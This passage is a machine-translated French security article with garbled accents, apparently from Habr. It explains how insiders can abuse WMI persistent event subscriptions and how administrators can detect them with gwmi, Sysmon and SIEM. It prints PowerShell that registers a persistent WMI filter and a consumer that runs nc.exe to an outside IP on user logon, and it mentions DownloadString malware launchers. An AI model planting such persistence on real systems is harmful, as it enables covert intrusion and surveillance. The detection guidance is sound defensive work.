Il semblait prometteur et semblait fonctionner correctement selon le journal des √©v√©nements Windows dans le syst√®me cible. </font><font style="vertical-align: inherit;">Cependant, en y regardant de plus pr√®s, j'ai r√©alis√© que cela ne fonctionne pas. </font><font style="vertical-align: inherit;">Je suis s√ªr qu'√† la fin je pourrais l'amener √† la bonne forme, mais pour cela, j'aurais besoin de temps et de caf√©, beaucoup de caf√©. </font><font style="vertical-align: inherit;">Il existe une autre option, un peu moins discr√®te et pas du tout sans fichier: vous pouvez utiliser smbclient pour transf√©rer le script, puis l'ex√©cuter directement sur l'ordinateur cible.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/qo/vq/jc/qovqjcy0lqzkf5v3bvaxglub5eu.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 L'ex√©cution √† distance de l'applet de commande Register-Event complexe me semblait absolument correcte. </font><font style="vertical-align: inherit;">Mais cela n'a pas fonctionn√©. </font><font style="vertical-align: inherit;">Eh bien, </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
h√©las. H√©las, √† ce stade, mes hypoth√®ses qu'une puce, mais pas initi√© trop exp√©riment√© pourrait facilement utiliser des </font><font style="vertical-align: inherit;">√©v√©nements temporaires WMI pour la </font><font style="vertical-align: inherit;">surveillance secr√®te a commenc√© √† se d√©sagr√©ger.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pourquoi utiliser des √©v√©nements constants pour l'observation? </font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le correct et en m√™me temps n√©cessitant une connaissance plus approfondie est d'utiliser des √©v√©nements WMI persistants. Les √©v√©nements WMI permanents, bien que d'une certaine complexit√©, sont non seulement un outil plus efficace pour les espions internes que les √©v√©nements temporaires, mais ils vous permettent √©galement de surveiller plus efficacement les menaces internes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L'√©tude des √©v√©nements persistants prendra un certain temps, mais ils repr√©sentent le moyen le plus efficace de mettre en ≈ìuvre un syst√®me de surveillance rigoureux pour les grands syst√®mes. Ils ont plus de capacit√©s que les √©v√©nements WMI temporaires. Ils peuvent √©galement √™tre utilis√©s pour vous alerter d'une activit√© malveillante non standard, telle que la tunnelisation DNS ou les violations de strat√©gie </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Zero Trust.</font></font></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
J'ai pass√© quelques jours √† √©tudier les √©v√©nements persistants et j'ai constat√© que PowerShell avait une applet de commande sp√©ciale qui simplifie le processus de cr√©ation d'un filtre d'√©v√©nements, d'un consommateur et d'objets WMI entre le filtre et le consommateur. Comme nous le savons tous, PowerShell offre aux administrateurs de nombreuses opportunit√©s de simplifier leur travail. Malheureusement, cet exemple montre comment les attaquants peuvent tirer parti de ces excellentes fonctionnalit√©s. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Un initi√© cr√©e un √©v√©nement constant sur le syst√®me cible, se lib√©rant ainsi de la n√©cessit√© d'√™tre pr√©sent dans une session shell. L'√©v√©nement y reste pour toujours ou jusqu'√† ce qu'il soit explicitement supprim√©. Vous pouvez en savoir plus sur la fa√ßon de proc√©der </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ici.</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mais dans l'ensemble, le processus est similaire √† ce que j'ai fait ci-dessus avec un √©v√©nement temporaire. </font><font style="vertical-align: inherit;">La derni√®re chose dont notre pirate a besoin est d'associer un filtre d'√©v√©nements √† un consommateur d'√©v√©nements. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Je conviens que pour un employ√© ordinaire qui a soudainement d√©cid√© de devenir un pirate mal√©fique, cela a l'air trop cool. </font><font style="vertical-align: inherit;">Par int√©r√™t, j'ai lu divers </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">forums</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> et j'ai vu que beaucoup de gens luttent sans succ√®s pour que les √©v√©nements constants de WMI fonctionnent. </font><font style="vertical-align: inherit;">Cependant, cela ne va pas au-del√† des capacit√©s de nos "Snowden" et d'autres administrateurs syst√®me avis√©s qui ont d√©cid√© de passer du c√¥t√© obscur.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">√âv√©nements constants: conseils pour les administrateurs informatiques</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/8c/gh/rn/8cghrnfq5mao1zm9d5-95y2kdys.jpeg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ces m√©thodes ne visent pas √† former des pirates informatiques potentiels ou des employ√©s offens√©s qui souhaitent se venger de l'employeur. </font><font style="vertical-align: inherit;">Tout ce que je veux faire, c'est aider les informaticiens √† comprendre l'√©tat d'esprit du pirate afin qu'ils puissent mettre en ≈ìuvre une protection appropri√©e contre les attaques de p√©n√©tration. </font><font style="vertical-align: inherit;">Pour eux, je montre comment configurer le filtre et les objets de consommation √† l'aide de l' </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">applet de commande Set-WmiInstance</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
<font></font>
EventNamespace = 'root/cimv2'<font></font>
Name = ‚Äúcruella‚Äù<font></font>
Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
<font></font>
<font></font>
$command = "powershell.exe -Command {$names = gwmi Win32_Process; $users=@(); foreach ($n in $names) {$users += $n.GetOwner().User}; foreach ($u in $users) {if ($u -eq 'cruella') { C:\users\lex\Documents\nc.exe 172.31.45.240 10000}}}"<font></font>
<font></font>
<font></font>
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{<font></font>
Name = "Consumer"<font></font>
CommandLineTemplate = $Command<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Votre devoir est de trouver du code PowerShell qui relie ces deux composants ensemble. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Au cours de mes propres tests, j'ai pu obtenir un √©v√©nement permanent pour travailler sur le syst√®me cible sans effort ni souffrance indus. </font><font style="vertical-align: inherit;">Comme vous vous en souvenez, cela a √©t√© tr√®s difficile √† r√©aliser avec des √©v√©nements WMI temporaires qui durent aussi longtemps qu'une session PowerShell.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En configurant un √©v√©nement WMI persistant, par exemple, pour surveiller la connexion des utilisateurs, un initi√© ou un pirate n'est pas tenu de rester dans le syst√®me cible. Un avantage suppl√©mentaire est qu'un √©v√©nement WMI persistant est robuste: lorsque l'ordinateur red√©marre, les d√©clencheurs d'√©v√©nements fonctionnent toujours. Cela fait des √©v√©nements persistants WMI un moyen puissant et secret de d√©clencher une attaque, ce qui peut impliquer bien plus qu'une simple surveillance. Comme vous vous en souvenez, les √©v√©nements WMI sont loin d'√™tre le premier endroit o√π les sp√©cialistes de la s√©curit√© rechercheront la source de l'attaque. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Par exemple, le code PowerShell pour un consommateur d'√©v√©nements peut agir comme un lanceur et t√©l√©charger des logiciels malveillants stock√©s sur un serveur distant √† l'aide de </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadString</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Grande </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pr√©sentation</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Matt Graber √† la conf√©rence Black Hat contient beaucoup d'informations sur le potentiel malveillant des √©v√©nements WMI persistants. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si vous √™tes un sp√©cialiste de la s√©curit√©, comment allez-vous travailler avec les √©v√©nements WMI en termes d'utilisation potentielle malveillante? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bonne chance de votre c√¥t√©: √† l'aide de l'applet de commande Get-WmiObject (alias gwmi), vous pouvez cr√©er une liste de filtres d'√©v√©nements, de consommateurs et d'objets de liaison:</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ug/ql/gd/ugqlgdjx1alwtunb4oczheoxh3k.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Vous r√©pertoriez les √©v√©nements persistants WMI √† l'aide de Get-WMIObject et d√©finissez les param√®tres appropri√©s. </font><font style="vertical-align: inherit;">Notez l'absence d'horodatage. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
D√©sormais, s'ils trouvent suspect le filtre (ou consommateur) d'un √©v√©nement permanent, les informaticiens peuvent le d√©sactiver en le supprimant √† l'aide du pipeline PowerShell et de l' </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">applet de commande WMI-RemoveObject</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/uo/t-/lj/uot-ljlw9zzi_jw5xosdyeaikwa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 La suppression d'√©v√©nements WMI persistants implique l'utilisation du pipeline PowerShell. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Notez que ni l'heure de g√©n√©ration de l'√©v√©nement ni le nom de l'utilisateur malveillant ne sont sp√©cifi√©s ici. </font><font style="vertical-align: inherit;">Pour obtenir ces informations m√©dico-l√©gales, vous devrez consulter les journaux des √©v√©nements Windows. </font><font style="vertical-align: inherit;">Plus d'informations ci-dessous.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Puis-je d√©sactiver les √©v√©nements WMI persistants?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
√Ä tout le moins, les professionnels de l'informatique peuvent rapidement voir les √©v√©nements persistants WMI enregistr√©s et commencer √† analyser des sc√©narios r√©els pour d√©tecter des signes de menaces. Peut-√™tre, en tant que sp√©cialiste de la s√©curit√© informatique exp√©riment√©, vous pensez que tout le monde n'a pas besoin de WMI sur les ordinateurs portables et la meilleure strat√©gie pour faire face aux vuln√©rabilit√©s d'√©v√©nements persistants WMI est de d√©sactiver compl√®tement WMI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous pouvez essayer de d√©sactiver le service </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Winmgmt</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , qui d√©marre WMI. En pratique, ce n'est pas si simple. Au cours de mes propres tests, je n'ai pas pu d√©sactiver ce service: il a red√©marr√© automatiquement encore et encore. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Supposons que vous ayez quand m√™me r√©ussi √† le d√©sactiver. Le logiciel d'administration Windows d√©pend fortement de WMI et ne fonctionnera pas si Winmgmt n'est pas disponible. </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;">Forums</font></a><font style="vertical-align: inherit;"> partout sur Internet</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rempli de messages mettant en garde contre la d√©sactivation de WMI. </font><font style="vertical-align: inherit;">Je vous conseille d'√©couter et d'avoir piti√© de votre WMI.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Identifier les √©v√©nements WMI de menace avec Sysmon et SIEM</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En g√©n√©ral, vous devrez accepter la vuln√©rabilit√© d'√©v√©nement WMI comme un fait. Heureusement, il existe des moyens plus efficaces pour d√©tecter les √©v√©nements persistants et autres op√©rations d'√©v√©nement suspect sur Windows que d'utiliser l'applet de commande Powershell susmentionn√©e. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Rencontrez Sysmon! Je n'entrerai pas dans les d√©tails de cet utilitaire Windows gratuit, qui peut √™tre t√©l√©charg√© </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ici</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dans cet article. Je peux seulement dire qu'il vous permet d'obtenir des informations tr√®s utiles pour l'analyse en un seul endroit, au lieu de visualiser chaque journal des √©v√©nements Windows individuellement. Les utilisateurs de Windows 7 et versions ult√©rieures peuvent ne pas avoir besoin de Sysmon, car les nouveaux syst√®mes Windows utilisent des m√©canismes de journalisation standard plus avanc√©s.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/tv/-l/_2/tv-l_2ztyvfhhag1nf3faxi5qji.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Sysmon est un outil de journalisation des √©v√©nements pratique et intuitif de Microsoft. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sysmon attribue l'identifiant d'√©v√©nement 19 √† la cr√©ation d'un √©v√©nement de filtre WMI permanent (20 est attribu√© pour cr√©er un √©v√©nement consommateur WMI et 21 est affect√© √† la liaison WMI). Si vous ouvrez l'Observateur d'√©v√©nements, vous trouverez le journal des √©v√©nements Sysmon dans la section Microsoft -&gt; Windows -&gt; Sysmon. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous ne souhaitez pas ouvrir l'observateur d'√©v√©nements manuellement pour surveiller les √©v√©nements WMI persistants, ce qui peut √™tre un signe d'activit√© de pirate. Nous savons comment vous aider. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pourquoi ne pas cr√©er un filtre d'√©v√©nements persistants WMI pour surveiller la cr√©ation (devin√©?) D'un √©v√©nement persistant WMI? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sur </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">github</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Il y a un petit projet o√π vous trouverez du code pour configurer cette op√©ration. </font><font style="vertical-align: inherit;">Voici un extrait de code pour un filtre d'√©v√©nement WMI qui vous permet de suivre la cr√©ation de ... oui, un filtre d'√©v√©nement WMI:</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
EventNamespace = 'root/subscription'<font></font>
Name = '_PersistenceEvent_'<font></font>
Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 Where TargetInstance ISA "__EventConsumer"'<font></font>
<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
√âvidemment, nous avons ici besoin de l'aide d'outils de s√©curit√© de l'information et de gestion des √©v√©nements de s√©curit√© (SIEM), car les preuves sont enfouies dans les d√©combres des magazines. </font><font style="vertical-align: inherit;">Je pense que vous comprenez o√π tout va. </font><font style="vertical-align: inherit;">Vous aurez besoin d'une </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">solution de surveillance de la s√©curit√©</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> qui combine les fonctionnalit√©s SIEM avec l'analyse d'autres menaces pour d√©tecter et √©liminer les menaces associ√©es aux √©v√©nements WMI persistants.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Foire aux questions sur l'instrumentation de gestion Windows</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Les m√©thodes d√©crites ci-dessus peuvent tr√®s bien √™tre utilis√©es pour impl√©menter un syst√®me de surveillance sur votre r√©seau, cependant, vous pourriez avoir des questions sur WMI. </font><font style="vertical-align: inherit;">Dans cette section, nous r√©pondrons aux plus courants.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI est-il obsol√®te?</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI lui-m√™me n'est pas obsol√®te, mais WMIC a √©t√© d√©pr√©ci√©, ce qui pr√™te √† confusion pour de nombreuses personnes. </font><font style="vertical-align: inherit;">PowerShell est d√©sormais utilis√© pour acc√©der aux fonctions pr√©c√©demment fournies par WMIC.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Quels ports WMI utilise-t-il? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI utilise le port TCP 135 et un certain nombre de ports dynamiques: 49152-65535 (ports RPC dynamiques: Windows Vista, 2008 et sup√©rieur), TCP 1024-65535 (ports RPC dynamiques: Windows NT4, Windows 2000, Windows 2003). </font><font style="vertical-align: inherit;">Vous pouvez √©galement configurer une plage de ports personnalis√©e pour WMI.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI utilise-t-il WimRM? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette configuration n'est pas standard, mais vous pouvez utiliser WMI pour r√©cup√©rer des donn√©es √† l'aide de scripts ou d'applications √† l'aide de l'API de script WinRM ou √† l'aide de l'outil de ligne de commande Winrm. </font><font style="vertical-align: inherit;">WinRM peut utiliser WMI pour collecter des donn√©es de ressources ou pour g√©rer des ressources dans le syst√®me d'exploitation Windows.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Conclusion</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Comme nous l'avons vu, WMI fournit aux administrateurs un outil puissant pour surveiller les processus et les ordinateurs distants et peut √™tre utilis√© pour d√©velopper des accords de surveillance des utilisateurs finaux (EUMA) pour alerter automatiquement les activit√©s suspectes. </font><font style="vertical-align: inherit;">Cela en fait un excellent outil pour d√©tecter et √©liminer les menaces internes, emp√™cher les tentatives de contournement des politiques de s√©curit√© et surveiller l'utilisation de vos syst√®mes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si vous souhaitez en savoir plus sur la fa√ßon d'utiliser WMI pour surveiller l'activit√© des initi√©s, vous pouvez t√©l√©charger notre guide d√©taill√© </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ici</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr507048/index.html">Olya, tests et usine - le chemin vers une architecture magnifique et du code propre</a></li>
<li><a href="../fr507050/index.html">Analyse de la conception du jeu Hollow Knight. Partie 1. Carrefour oubli√©</a></li>
<li><a href="../fr507052/index.html">Le Data Scientist le plus cool ne perd pas de temps en statistiques</a></li>
<li><a href="../fr507058/index.html">Joel Spolsky: r√¥le de ludification dans le succ√®s du d√©bordement de pile</a></li>
<li><a href="../fr507066/index.html">10 fa√ßons d'automatiser les publicit√©s sur Google Ads</a></li>
<li><a href="../fr507074/index.html">Aide-m√©moire SIMD, maintenant pour .NET Core</a></li>
<li><a href="../fr507078/index.html">Le tribunal a ordonn√© aux m√©dias de retirer l'article de quelqu'un d'autre et de publier une r√©futation sur le principal Yandex</a></li>
<li><a href="../fr507080/index.html">Toutes les coupes: l'histoire d'une conception de grand √©cosyst√®me</a></li>
<li><a href="../fr507084/index.html">Les f√™tes SpatialChat sont devenues populaires pendant la pand√©mie - et il est peu probable qu'elles se terminent apr√®s l'anse</a></li>
<li><a href="../fr507086/index.html">Convertir le script Bash en code C # pour envoyer des SMS via le modem USB HUAWEI E3372</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>